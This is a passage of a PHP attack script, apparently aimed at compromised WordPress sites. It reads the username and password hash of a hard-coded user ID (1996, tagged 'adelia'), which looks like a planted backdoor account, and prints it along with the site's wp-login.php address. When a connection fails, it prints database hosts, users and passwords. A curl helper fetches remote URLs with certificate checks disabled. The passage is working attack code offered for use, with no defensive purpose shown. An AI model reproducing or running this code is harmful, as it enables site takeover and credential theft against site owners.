                        $fecthdata = "SELECT user_login, user_pass FROM $tableuser WHERE ID='1996'";
                        $result = $connection->query($fecthdata);
                        if ($result->num_rows > 0) {
                        // output data of each row
                        while($row = $result->fetch_assoc()) {
                        ob_flush();
                        flush();
                         echo "Username: " . $row["user_login"]. " Password: " . $row["user_pass"]."(adelia) ";
                         $tblpost = preg_replace('/users$/', 'posts', $tableuser);
                         $fetchdomain = "SELECT guid FROM $tblpost WHERE post_author='1'";
                         $resultdomain = $connection->query($fetchdomain);
                         while($rowdomain = $resultdomain->fetch_assoc()){
                            $domainono = preg_replace('/http:\/\/|https:\/\//', '', $rowdomain["guid"]);
                            $domain1 = preg_replace('/www./', '', $domainono);
                            $domain2 = preg_replace('/\/.*$/', '', $domain1);
                            ob_flush();
                            flush();
                            echo "Domain: http://".$domain2."/wp-login.php<br>";
                            break;
                         }
                          }
                       }
                        break;
                    }
        		}
        	}
        	else{
        		ob_flush();
        	    flush();
        		echo "<font color='red'>NotConnect : ".$wphost."|".$wpuser."|".$wppassword."|".$wpdbname."</font><br>";
        	}
        	        	
        }
        else{
        }
}
}
}
else{
	ob_flush();
	flush();
	echo "null";
}

function requestfile($web){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $web);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$output = curl_exec($ch);
curl_close($ch);
return $output;
}
?>
